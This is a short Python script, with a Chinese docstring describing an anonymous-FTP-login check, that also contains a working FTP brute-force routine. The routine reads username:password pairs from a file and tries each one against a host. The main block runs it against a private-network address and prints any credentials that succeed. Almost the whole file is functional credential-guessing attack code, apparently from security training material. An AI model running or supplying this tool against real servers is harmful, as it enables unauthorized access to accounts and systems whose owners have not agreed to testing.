#!/usr/bin/env python3

'''
anon_login.py: 该程序用来确定是否可以允许匿名登录ftp服务器,
在该程序中使用了ftplib库
'''

import ftplib

def anonLogin(hostname):
    try:
        ftp = ftplib.FTP(hostname)
        ftp.login('anonymous', 'me@your.com')
        print('\n[*] ' + str(hostname) + ' FTP Anonymous Logon Succeeded!')
        ftp.quit()
        return True
    except Exception as e:
        print('\n[-] ' + str(hostname) + ' FTP Anonymous Logon Failed!')
        return False

def brutelogin(hostname, passwdFile):
    pf = open(passwdFile, mode='r')
    for line in pf.readlines():
        username = line.split(':')[0]
        password = line.split(":")[1].strip('\n')
        print('[+] Tring:' + username + '/' + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(username, password)
            print('\n[*] ' + str(hostname) + ' FTP Logon Successed ' + username + '/' + password)
            ftp.quit()
            return (username, password)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.d')
    return (None, None)


if __name__ == '__main__':
    host = '192.168.1.108'
    passwdFile = 'userpass.txt'
    # anonLogin(host)
    print(brutelogin(host, passwdFile))

